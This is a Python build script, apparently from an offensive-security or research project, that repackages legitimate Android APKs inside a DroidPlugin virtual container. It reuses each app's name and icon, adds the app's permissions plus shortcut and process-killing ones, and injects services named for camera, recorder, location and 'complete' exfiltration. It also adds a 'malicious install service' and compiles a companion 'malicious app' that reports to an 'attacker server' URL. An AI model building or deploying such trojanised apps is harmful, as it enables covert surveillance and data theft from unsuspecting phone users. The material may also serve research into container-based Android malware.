#!/usr/bin/env python3
# -*- coding: utf-8 -*-


from androguard.core.bytecodes.apk import APK
import string
from collections import defaultdict
import os
import subprocess
import tempfile
import shutil
import argparse
from termcolor import cprint
from functools import partial
import re
import glob
from contextlib import contextmanager

######################################################################################################################
print_msg = partial(cprint, color="green")
print_info = partial(cprint, color="yellow")
print_err = partial(cprint, color="red")

######################################################################################################################
######################################################################################################################
#The Container which creates the virtual environment, where both the plugin app and the malicious app will run
class Container:
    stub_pkg_base_dir = "./virtual-container/DroidPlugin/src"
    res_dir = "./virtual-container/app/src/main/res"
    app_pkg_dir_base = "./virtual-container/app/src/main/java"

    ##################################################################################################
    @staticmethod
    def create_source_directory():
        src_dir = "./virtual-container/app/src/main/java"
        shutil.rmtree(src_dir, ignore_errors=True)
        os.makedirs(src_dir)

    ##################################################################################################
    @staticmethod
    def _get_superclass(template):
        class_def_re = re.compile(
            r"public class \$?\w+ extends (?P<type>\w+)\s*\{?",
            re.ASCII
        )
        match = class_def_re.search(template.template)
        if match is not None:
            return match.group("type")

    ##################################################################################################
    @contextmanager
    def change_directory(dir_):
        cwd = os.getcwd()
        os.chdir(dir_)
        try:
            yield
        finally:
            os.chdir(cwd)

    ##################################################################################################
    @classmethod
    def _compile_app(cls, app_dir):
        with cls.change_directory(app_dir):
            gradle = subprocess.run(
                ["bash", "gradlew", "assembleDebug"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
                check=False
            )
            try:
                gradle.check_returncode()
            except subprocess.CalledProcessError:
                err_msg = "[!] Compilation failed for {}".format(app_dir)
                print_err(err_msg)
                err_info = gradle.stderr.decode()
                raise CompilationError("{}:\n{}".format(
                    err_msg, err_info))

    ##################################################################################################
    @classmethod
    def _move_apk(cls, app_dir, output, plugin_apk_name):
        with cls.change_directory(app_dir):
            os.rename("app/build/outputs/apk/debug/app-debug.apk", "app/build/outputs/apk/debug/" + plugin_apk_name)
            shutil.copy("app/build/outputs/apk/debug/"+plugin_apk_name, output)

    ##################################################################################################
    def __init__(self, plugin_apk_path, launcher_icon_path, container_pkgname, server, plugin_apk_name, malicious=True):
        self.plugin_apk_path = plugin_apk_path
        self.launcher_icon_path = launcher_icon_path
        self.pkgname = container_pkgname
        self.server = server
        self.malicious = malicious
        self.plugin_apk_name = plugin_apk_name
        self.plugin = Plugin(self.plugin_apk_path)
        self.get_new_names()

    ##################################################################################################
    def get_new_names(self):
        print_msg("[*] Renaming additional components")
        unnamed_templates = [
            template for template in CodeTemplate.__dict__.values()
            if isinstance(template, string.Template) and template.variable
        ]
        classes = defaultdict(list)
        for template in unnamed_templates:
            classes[self._get_superclass(template)].append(template)
        plugin_name = self.plugin.get_app_name()
        new_names = {}
        for class_ in classes:
            for index, template in enumerate(classes[class_]):
                assert template.variable, \
                    ("template must have a `variable` attr, "
                     "otherwise getting a new name for it is useless")
                new_names[template.variable] = "".join(map(str.capitalize,
                                                           template.variable.split("_")))
        self.new_names = new_names
        for varname, new_name in new_names.items():
            print_info("[-] \t{0}: {1}".format(varname, new_name))

    ##################################################################################################
    def install(self, output=None):
        print_msg("[*] Creating source directory")
        self.create_source_directory()
        print_msg("[*] Creating stub activities")
        self.create_stub_activity_files()
        print_msg("[*] Creating stub services")
        self.create_stub_service_files()
        print_msg("[*] Creating stub providers")
        self.create_stub_provider_files()
        print_msg("[*] Creating stub receivers")
        self.create_stub_receiver_files()

        print_msg("[*] Creating malicious stubs")
        self.create_malicious_stubs()
        print_msg("[*] Adding stubs to droidplugin's list")
        self.add_stubs_to_droidplugin_list()
        print_msg("[*] Creating droidplugin's manifest")
        self.create_droidplugin_manifest()
        print_msg("[*] Creating droidplugin's files")
        self.create_droidplugin_files()
        print_msg("[*] Creating app's manifest")
        self.create_app_manifest()
        print_msg("[*] Copying resources")
        self.copy_resources()
        print_msg("[*] Creating package directory structure")
        self.create_app_pkg_dir()
        print_msg("[*] Creating app files")
        self.create_app_files()
        print_msg("[*] Creating app's malicious install service")
        self.create_app_malicious_install_service()
        print_msg("[*] Compiling malicious app")
        self.compile_malicious_app(output)
        print_msg("[*] Compiling app")
        self.compile_app(output)

    ##################################################################################################
    def create_stub_activity_files(self):
        # stub_activity_pkgs = {stub pkg: [stub classes in that package]}
        # eg. {'org.telegram.ui': 'LaunchActivity.java'}
        stub_activity_pkgs = defaultdict(list)
        for stub_activity in self.plugin.get_activities():
            pkg, name = stub_activity.rsplit(".", maxsplit=1)
            stub_activity_pkgs[pkg].append(name)
        # create stub package directory trees
        for pkg in stub_activity_pkgs:
            os.makedirs(os.path.join(self.stub_pkg_base_dir,
                                     pkg.replace(".", os.sep)),
                        exist_ok=True)
        # create stub activity files
        for pkg, activities in stub_activity_pkgs.items():
            for activity in activities:
                with open(
                        os.path.join(self.stub_pkg_base_dir,
                                     pkg.replace(".", os.sep),
                                     "{}.java".format(activity)), "w+") as fp:
                    fp.write(
                        CodeTemplate.stub_activity_java.safe_substitute(
                            PACKAGE=pkg, NAME=activity
                        )
                    )

    ##################################################################################################
    def create_stub_service_files(self):
        stub_service_pkgs = defaultdict(list)
        for stub_service in self.plugin.get_services():
            pkg, name = stub_service.rsplit(".", maxsplit=1)
            stub_service_pkgs[pkg].append(name)
        # create stub package directory trees
        for pkg in stub_service_pkgs:
            os.makedirs(os.path.join(self.stub_pkg_base_dir,
                                     pkg.replace(".", os.sep)),
                        exist_ok=True)
        # create stub service files
        for pkg, services in stub_service_pkgs.items():
            for service in services:
                with open(
                        os.path.join(self.stub_pkg_base_dir,
                                     pkg.replace(".", os.sep),
                                     "{}.java".format(service)), "w+") as fp:
                    fp.write(
                        CodeTemplate.stub_service_java.safe_substitute(
                            PACKAGE=pkg, NAME=service
                        )
                    )

    ########   MODIFICHE :  #######################################################
    def create_stub_provider_files(self):
        # stub_provider_pkgs = {stub pkg: [stub classes in that package]}
        # eg. {'org.telegram.ui': 'Launchprovider.java'}
        #print_info(self.plugin.get_providers())
        stub_provider_pkgs = defaultdict(list)
        for stub_provider in self.plugin.get_providers():
            pkg, name = stub_provider.rsplit(".", maxsplit=1)
            stub_provider_pkgs[pkg].append(name)
        # create stub package directory trees
        for pkg in stub_provider_pkgs:
            os.makedirs(os.path.join(self.stub_pkg_base_dir,
                                     pkg.replace(".", os.sep)),
                        exist_ok=True)
        # create stub provider files
        for pkg, providers in stub_provider_pkgs.items():
            for provider in providers:
                with open(
                        os.path.join(self.stub_pkg_base_dir,
                                     pkg.replace(".", os.sep),
                                     "{}.java".format(provider)), "w+") as fp:
                    fp.write(
                        CodeTemplate.stub_provider_java.safe_substitute(
                            PACKAGE=pkg, NAME=provider
                        )
                    )

    ##################################################################################################
    def create_stub_receiver_files(self):
        # stub_receiver_pkgs = {stub pkg: [stub classes in that package]}
        # eg. {'org.telegram.ui': 'Launchreceiver.java'}
        stub_receiver_pkgs = defaultdict(list)
        for stub_receiver in self.plugin.get_receivers():
            pkg, name = stub_receiver.rsplit(".", maxsplit=1)
            stub_receiver_pkgs[pkg].append(name)
        # create stub package directory trees
        for pkg in stub_receiver_pkgs:
            os.makedirs(os.path.join(self.stub_pkg_base_dir,
                                     pkg.replace(".", os.sep)),
                        exist_ok=True)
        # create stub receiver files
        for pkg, receivers in stub_receiver_pkgs.items():
            for receiver in receivers:
                with open(
                        os.path.join(self.stub_pkg_base_dir,
                                     pkg.replace(".", os.sep),
                                     "{}.java".format(receiver)), "w+") as fp:
                    fp.write(
                        CodeTemplate.stub_receiver_java.safe_substitute(
                            PACKAGE=pkg, NAME=receiver
                        )
                    )
    ##################################################################################################
    def create_malicious_stubs(self):
        for template in [
                CodeTemplate.complete_exfil_listener_stub,
                CodeTemplate.complete_exfil_service_stub,
                CodeTemplate.camera_exfil_service_stub,
                CodeTemplate.recorder_exfil_service_stub,
                CodeTemplate.location_exfil_service_stub,
                ]:
            new_name = self.new_names[template.variable]
            with open(template.path.format(name=new_name), "w+") as fp:
                print_info(new_name)
                fp.write(template.safe_substitute(NAME=new_name,
                                                  PACKAGE="com.morgoo.droidplugin.stub"))

    ##################################################################################################
    def add_stubs_to_droidplugin_list(self):
        malicious_stub_names = [
            "com.morgoo.droidplugin.stub.{}".format(
                self.new_names[template.variable])
            for template in (
                CodeTemplate.camera_exfil_service_stub,
                CodeTemplate.recorder_exfil_service_stub,
                CodeTemplate.complete_exfil_service_stub,
                CodeTemplate.complete_exfil_listener_stub,
                CodeTemplate.location_exfil_service_stub,
            )
        ]
        print_info(malicious_stub_names)
        stubs = malicious_stub_names + self.plugin.get_components()
        with open(CodeTemplate.stub_env_java.path, "w+") as fp:
            fp.write(
                CodeTemplate.stub_env_java.safe_substitute(
                    CONTAINER_PACKAGE_NAME=self.pkgname,
                    PLUGIN_PACKAGE_NAME=self.plugin.pkgname,
                    MALIICIOUS_PACKAGE_NAME="attacker.malicious",
                    STUB_COMPONENTS=", ".join(
                        '"{}"'.format(stub) for stub in stubs)))

    ##################################################################################################
    def create_droidplugin_manifest(self):
        with open(CodeTemplate.droidplugin_manifest.path, "w+") as fp:
            fp.write(self.get_droidplugin_manifest())

    ##################################################################################################
    def create_droidplugin_files(self):
        for template in [
                CodeTemplate.droidplugin_pluginmanagerservice,
                CodeTemplate.droidplugin_pluginserviceprovider,
                CodeTemplate.droidplugin_shortcutproxyactivity,
                CodeTemplate.droidplugin_iactivitymanagerhookhandle,
                CodeTemplate.droidplugin_pluginmanager,
                CodeTemplate.droidplugin_plugincallback,
                ]:
            if template.variable:
                path = template.path.format(
                    name=self.new_names[template.variable])
            else:
                path = template.path
            os.makedirs(os.path.abspath(os.path.dirname(path)), exist_ok=True)
            with open(path, "w+") \
                    as fp:
                fp.write(template.safe_substitute(
                    **self.new_names))

    ##################################################################################################
    def create_app_manifest(self):
        with open(CodeTemplate.app_manifest.path, "w+") as fp:
            fp.write(self.get_app_manifest())

    ##################################################################################################
    def copy_resources(self):
        self.plugin.get_resources(self.res_dir)
        for x in os.listdir(self.res_dir):
                resource_path = self.res_dir + '/' + x + '/'
                os.rename((resource_path + self.plugin.get_app_icon_attr().split("/", 1)[1] + '.png'), (resource_path + 'shortcut.png'))
                if(x.startswith('drawable')) or x.startswith('mipmap'):
                    shutil.copy(self.launcher_icon_path, resource_path)
                    for img in os.listdir(resource_path):
                        if(img.startswith("shortcut") == False):
                            os.rename(resource_path + img, resource_path + self.plugin.get_app_icon_attr().split("/", 1)[1] + '.png')

   ##################################################################################################
    def create_app_pkg_dir(self):
        for elem in os.listdir(self.app_pkg_dir_base):
            shutil.rmtree(os.path.join(self.app_pkg_dir_base, elem))
        pkg_dir_tree = self.pkgname.replace(".", "/")
        os.makedirs(os.path.join(self.app_pkg_dir_base, pkg_dir_tree))
        os.makedirs(os.path.join(self.res_dir, "xml"))  # for shortcuts.xml
        os.makedirs(os.path.join(self.res_dir, "values"))  # for strings.xml

    ##################################################################################################
    def create_app_files(self):
        # WARNING: call `create_app_pkg_dir` beforehand
        for template in [
                CodeTemplate.app_build_gradle,
                CodeTemplate.droidplugin_build_gradle,
                CodeTemplate.app_main_activity,
                CodeTemplate.app_shortcut_xml,
                CodeTemplate.app_strings_xml,
                ]:
            shortcut_icon_r_var = "R." + self.plugin.get_app_icon_R_var().split(".", 2)[1] + ".shortcut"

            with open(template.path.format(
                    PKGNAME=self.pkgname.replace(".", "/")), "w+") as fp:
                fp.write(template.safe_substitute(
                    PKGNAME=self.pkgname,
                    PLUGIN_PKGNAME=self.plugin.pkgname,
                    SHORTCUT_ICON=self.plugin.get_app_icon_attr(),
                    SHORTCUT_ICON_R_VAR=shortcut_icon_r_var,
                    APP_NAME=self.plugin.get_app_name(),
                    MAIN_CLASS="{pkg}.MainActivity".format(pkg=self.pkgname),
                    MALICIOUS=str(self.malicious).lower(),
                    SERVER=self.server,
                    **self.new_names
                ))

    ##################################################################################################
    def create_app_malicious_install_service(self):
        template = CodeTemplate.app_malicious_install_service
        new_name = self.new_names[template.variable]
        print_info(new_name)
        with open(template.path.format(
                PKGNAME=self.pkgname.replace(".", "/"),
                name=new_name), "w+") as fp:
            fp.write(template.safe_substitute(
                PKGNAME=self.pkgname, NAME=new_name,
                PLUGIN_PKGNAME=self.plugin.pkgname))

    ##################################################################################################
    def compile_malicious_app(self, output=None):
        self._compile_app("malicious-app")
        if output is not None:
            self._move_apk("malicious-app", output, self.plugin_apk_name[:-4] + "_mal_apk" + ".apk")

    ##################################################################################################
    def compile_app(self, output=None):
        self._compile_app("virtual-container")
        if output is not None:
            self._move_apk("virtual-container", output, self.plugin_apk_name[:-4] + "mal_addon" + ".apk")

    ##################################################################################################
    def get_stub_activities_as_xml(self):
        return '\n'.join(
            CodeTemplate.stub_activity_xml.safe_substitute(
                NAME=activity_name,
                PROC_NUM="01",
                LAUNCH_MODE=launch_mode,
                INDEX=index)
            for index, (activity_name, launch_mode) in
            enumerate(self.plugin.get_activity_launch_mode_map().items())
        )

    ##################################################################################################
    def get_stub_services_as_xml(self):
        return '\n'.join(
            CodeTemplate.stub_service_xml.safe_substitute(
                NAME=service,
                PROC_NUM="01",
            )
            for service in self.plugin.get_services()
        )

    ########### MODIFICHE ##################################################################
    def get_stub_providers_as_xml(self):
        return '\n'.join(
            CodeTemplate.stub_provider_xml.safe_substitute(
                NAME=provider,
                PROC_NUM="01",
            )
            for provider in self.plugin.get_providers() ##????
        )
    ########### MODIFICHE ##################################################################
    def get_stub_receivers_as_xml(self):
        return '\n'.join(
            CodeTemplate.stub_receiver_xml.safe_substitute(
                NAME=receiver,
                PROC_NUM="01",
            )
            for receiver in self.plugin.get_receivers()
        )
    ##################################################################################################
    def get_malicious_stubs_as_xml(self):
        # don't have to place receivers in the manifest
        return '\n'.join(
            CodeTemplate.stub_service_xml.safe_substitute(
                NAME="com.morgoo.droidplugin.stub.{}".format(
                    self.new_names[template.variable]),
                PROC_NUM="02",
            )
            for template in (
                CodeTemplate.complete_exfil_service_stub,
                CodeTemplate.camera_exfil_service_stub,
                CodeTemplate.recorder_exfil_service_stub,
                CodeTemplate.location_exfil_service_stub,
            )
        )

    ########### MODIFICHE ##################################################################
    def get_droidplugin_manifest(self):
        #print_info(self.get_stub_providers_as_xml())
        print_info(self.get_malicious_stubs_as_xml())
        return CodeTemplate.droidplugin_manifest.safe_substitute(
            PERMISSIONS=self.plugin.get_permissions_as_xml(),
        #    FEATURES=self.plugin.get_features_as_xml(),
            ACTIVITIES=self.get_stub_activities_as_xml(),
            SERVICES=self.get_stub_services_as_xml(),
            RECEIVERS=self.get_stub_receivers_as_xml(),
            PROVIDERS=self.get_stub_providers_as_xml(),
            MALICIOUS_STUBS=self.get_malicious_stubs_as_xml(),
            PKGNAME=self.pkgname,
            **self.new_names,
        )

    ##################################################################################################
    def get_app_manifest(self):
        return CodeTemplate.app_manifest.safe_substitute(
            APPNAME=self.plugin.get_app_name(),
            PKGNAME=self.pkgname,
            APPICON=self.plugin.get_app_icon_attr(),
            **self.new_names,
        )

    ##################################################################################################
    def add_apk_to_resources(self):
        # WARNING: run :meth:`copy_resources` before this
        assert os.path.exists(self.res_dir), "run `copy_resources` before"
        raw_res_dir = os.path.join(self.res_dir, 'raw')
        try:
            os.mkdir(raw_res_dir)
        except FileExistsError:
            pass
        shutil.copy(self.plugin.filename,
                    os.path.join(raw_res_dir, "plugin.apk"))

######################################################################################################################
######################################################################################################################
class Plugin(APK):
   ##################################################################################################
    @property
    def pkgname(self):
        return self.get_package()

    ##################################################################################################
    @staticmethod
    def _copy_file(file, base, newbase):
        """copy file tree with relative path `file` from base `base`
        to base `newbase`

        example:
        > _copy_file("abc/def/file.txt", "/tmp/base", "/root/")
        copies file "/tmp/base/abc/def/file.txt" to "/root/abc/def/file.txt"
        """
        dir_, _ = os.path.split(file)
        os.makedirs(os.path.join(newbase, dir_), exist_ok=True)
        shutil.copy(os.path.join(base, file),
                    os.path.join(newbase, file))

    ##################################################################################################
    @staticmethod
    def _convert_filename_to_res_attr(filename):
        dir_, file = os.path.split(filename)
        dir_ = dir_.split("-")[0]
        file = file.split(".")[0]
        return "@{dir_}/{file}".format(dir_=dir_, file=file)

    ##################################################################################################
    @staticmethod
    def _convert_filename_to_R_var(filename):
        dir_, file = os.path.split(filename)
        dir_ = dir_.split("-")[0]
        file = file.split(".")[0]
        return "R.{dir_}.{file}".format(dir_=dir_, file=file)

    ##################################################################################################
    def get_permissions(self):
        perms = super().get_permissions()
        shortcut_perm = "com.android.launcher.permission.INSTALL_SHORTCUT"
        killproc_perm = "android.permission.KILL_BACKGROUND_PROCESSES"
        if shortcut_perm not in perms:
            perms.append(shortcut_perm)
        if killproc_perm not in perms:
            perms.append(killproc_perm)
        return perms

    ##################################################################################################
    def get_permissions_as_xml(self):
        # <uses-permission android:name="android.permission.INTERNET" />
        return "\n".join(
            '\t<uses-permission android:name="{}" />'.format(permission)
            for permission in self.get_permissions()
        )

    ##################################################################################################
    def get_features_as_xml(self):
        return "\n".join(
            '\t<uses-feature android:name="{}" android:required="false" />'.format(feature)
            for feature in self.get_features()
        )

    ##################################################################################################
    def get_components(self):
        return self.get_activities() \
             + self.get_services() \
             + self.get_receivers() \
             + self.get_providers()

    ##################################################################################################
    def get_res_filenames(self):
        """get filenames of important resources
            1. icon
        """
        def get_filenames(obj):
            "get all nested strings starting with 'res/'"
            if isinstance(obj, str):
                return set([obj.split("res/")[1]]) \
                    if obj.startswith("res/") else set()

            filenames = set()
            if hasattr(obj, "__iter__"):
                for item in obj:
                    filenames.update(get_filenames(item))
            return filenames

        # cache results
        if hasattr(self, "_res_filenames"):
            return self._res_filenames
        else:
            self._res_filenames = {}

        ids = {
            "icon": self.get_element("application", "icon"),
        }
        res_parser = self.get_android_resources()
        for key, id_ in ids.items():
            self._res_filenames[key] = get_filenames(
                    res_parser.get_resolved_res_configs(int(id_[1:], 16)))

        return self._res_filenames

    ##################################################################################################
    def get_app_icon_attr(self):
        return self._convert_filename_to_res_attr(
            next(iter(self.get_res_filenames()["icon"])))

    ##################################################################################################
    def get_app_icon_R_var(self):
        return self._convert_filename_to_R_var(
            next(iter(self.get_res_filenames()["icon"])))

    ##################################################################################################
    def get_resources(self, outpath, force=True):
        if force:
            shutil.rmtree(outpath, ignore_errors=True)

        # unzip to extract images
        unzip_dir = tempfile.mkdtemp()
        subprocess.call(
            ["unzip", self.filename, "-d", unzip_dir],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        for _, files in self.get_res_filenames().items():
            for file in files:
                if is_img_file(file):
                    self._copy_file(file, os.path.join(unzip_dir, "res"), outpath)

    ##################################################################################################
    def get_activity_launch_mode_map(self):
        schema = "{http://schemas.android.com/apk/res/android}"
        launch_mode_map = [
            'standard',
            'singleTop',
            'singleTask',
            'singleInstance',
        ]
        return {
            activity.attrib.get("{}name".format(schema)):
                launch_mode_map[
                    int(activity.attrib.get(
                        "{}launchMode".format(schema), '0'))]

            for activity in

            self.get_android_manifest_xml()
                .find("application").findall("activity")
        }

######################################################################################################################
######################################################################################################################
def read_template(template_path, real_path=None, variable=None):
    with open(template_path) as fp:
        templ = string.Template(fp.read())
    templ.path = real_path
    templ.variable = variable
    return templ

######################################################################################################################
######################################################################################################################
class CodeTemplate:

    droidplugin_manifest = read_template(
        "./fragments/template.droidplugin_manifest.xml",
        "./virtual-container/DroidPlugin/AndroidManifest.xml"
    )
    app_manifest = read_template(
        "./fragments/template.app_manifest.xml",
        "./virtual-container/app/src/main/AndroidManifest.xml"
    )
    app_shortcut_xml = read_template(
        "./fragments/template.app_shortcuts.xml",
        "./virtual-container/app/src/main/res/xml/shortcuts.xml"
    )
    app_strings_xml = read_template(
        "./fragments/template.app_strings.xml",
        "./virtual-container/app/src/main/res/values/strings.xml"
    )
    stub_activity_xml = read_template(
        "./fragments/template.stub_activity.xml")
    stub_activity_java = read_template(
        "./fragments/template.stub_activity.java")
    stub_service_xml = read_template(
        "./fragments/template.stub_service.xml")
    stub_service_java = read_template(
        "./fragments/template.stub_service.java")
    stub_provider_xml = read_template(
        "./fragments/template.stub_provider.xml")
    stub_provider_java = read_template(
        "./fragments/template.stub_provider.java")
    stub_receiver_xml = read_template(
        "./fragments/template.stub_receiver.xml")
    stub_receiver_java = read_template(
        "./fragments/template.stub_receiver.java")


    stub_env_java = read_template(
        "./fragments/template.Env.java",
        ("./virtual-container/DroidPlugin/src/"
         "com/morgoo/droidplugin/core/Env.java")
    )
    app_build_gradle = read_template(
        "./fragments/template.app_build.gradle",
        "./virtual-container/app/build.gradle"
    )
    droidplugin_build_gradle = read_template(
        "./fragments/template.droidplugin_build.gradle",
        "./virtual-container/DroidPlugin/build.gradle"
    )
    droidplugin_iactivitymanagerhookhandle = read_template(
        "./fragments/template.iactivitymanagerhookhandle.java",
        ("./virtual-container/DroidPlugin/src/"
         "com/morgoo/droidplugin/hook/handle/IActivityManagerHookHandle.java")
    )
    droidplugin_plugincallback = read_template(
        "./fragments/template.plugincallback.java",
        ("./virtual-container/DroidPlugin/src/"
         "com/morgoo/droidplugin/hook/handle/PluginCallback.java")
    )
    droidplugin_pluginmanager = read_template(
        "./fragments/template.pluginmanager.java",
        ("./virtual-container/DroidPlugin/src/"
         "com/morgoo/droidplugin/pm/PluginManager.java")
    )
    droidplugin_pluginmanagerservice = read_template(
        "./fragments/template.pluginmanagerservice.java",
        ("./virtual-container/DroidPlugin/src"
         "/com/morgoo/droidplugin/{name}.java"),
        "PLUGIN_MANAGER_SERVICE"
    )
    droidplugin_pluginserviceprovider = read_template(
        "./fragments/template.pluginserviceprovider.java",
        ("./virtual-container/DroidPlugin/src/"
         "com/morgoo/droidplugin/{name}.java"),
        "PLUGIN_SERVICE_PROVIDER"
    )
    droidplugin_shortcutproxyactivity = read_template(
        "./fragments/template.shortcutproxyactivity.java",
        ("./virtual-container/DroidPlugin/src/"
         "com/morgoo/droidplugin/stub/{name}.java"),
        "SHORTCUT_PROXY_ACTIVITY"
    )
    app_malicious_install_service = read_template(
        "./fragments/template.app_malicious_install_service.java",
        "./virtual-container/app/src/main/java/{PKGNAME}/{name}.java",
        "APP_MALICIOUS_INSTALL_SERVICE"
    )
    app_main_activity = read_template(
        "./fragments/template.app_main_activity.java",
        ("./virtual-container/app/src/"
         "main/java/{PKGNAME}/MainActivity.java")
    )
    camera_exfil_service_stub = read_template(
        "./fragments/template.malicious_stub_service.java",
        ("./virtual-container/DroidPlugin/src/"
         "com/morgoo/droidplugin/stub/{name}.java"),
        "CAMERA_EXFIL_SERVICE"
    )
    recorder_exfil_service_stub = read_template(
        "./fragments/template.malicious_stub_service.java",
        ("./virtual-container/DroidPlugin/src/"
         "com/morgoo/droidplugin/stub/{name}.java"),
        "RECORDER_EXFIL_SERVICE"
    )
    location_exfil_service_stub = read_template(
        "./fragments/template.malicious_stub_service.java",
        ("./virtual-container/DroidPlugin/src/"
         "com/morgoo/droidplugin/stub/{name}.java"),
        "LOCATION_EXFIL_SERVICE"
    )
    complete_exfil_service_stub = read_template(
        "./fragments/template.malicious_stub_service.java",
        ("./virtual-container/DroidPlugin/src/"
         "com/morgoo/droidplugin/stub/{name}.java"),
        "COMPLETE_EXFIL_SERVICE"
    )
    complete_exfil_listener_stub = read_template(
        "./fragments/template.stub_receiver.java",
        ("./virtual-container/DroidPlugin/src/"
         "com/morgoo/droidplugin/stub/{name}.java"),
        "COMPLETE_EXFIL_LISTENER"
    )


######################################################################################################################
######################################################################################################################
class InvalidApkError(Exception):
    pass

######################################################################################################################
######################################################################################################################
class CompilationError(Exception):
    pass

######################################################################################################################
def is_img_file(file):
    return any(file.endswith("." + ext) for ext in ["jpg", "jpeg", "png"])

######################################################################################################################
def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("apk_dir", help="path to directory of apks which have to be customized")
    parser.add_argument("laucher_icon_dir", help="path to directory of launcher icons for the malicious add-on")
    parser.add_argument("output", help="path to output directory")
    parser.add_argument("pkgname", help="pkgname for the container")
    parser.add_argument("server", help="url of attacker server")
    parser.add_argument("--no-malicious", action="store_true",
                        help="turn off the container's malicious behaviour")
    args = parser.parse_args()
    return args

######################################################################################################################
def main(args):
    apks = [file for file in os.listdir(args.apk_dir) if file.endswith(".apk")]

    #Returns the current directory of the process
    cd = os.getcwd()
    if args.output.startswith(cd):
        raise RuntimeError("output directory has to be outside source directory")

    for i, apk in enumerate(apks):
        customized_dir = os.path.join(args.output, "{}-customized".format(apk))
        shutil.copytree(cd, customized_dir)
        print_msg("[{}/{}] {}".format(i + 1, len(apks), apk))
        mal= True
        os.chdir(os.path.join(cd, customized_dir))
        plugin_name = apk[:-4]
        for launcher_icon in os.listdir(args.laucher_icon_dir):
            if (launcher_icon.startswith(plugin_name)):
                launcher_icon_path = args.laucher_icon_dir + launcher_icon
        container = Container(os.path.join(args.apk_dir, apk), launcher_icon_path, args.pkgname, args.server, apk, mal)
        container.install(output=args.output)
        #shutil.rmtree(customized_dir, ignore_errors=True)
        print()

######################################################################################################################
if __name__ == "__main__":
    main(parse_args())
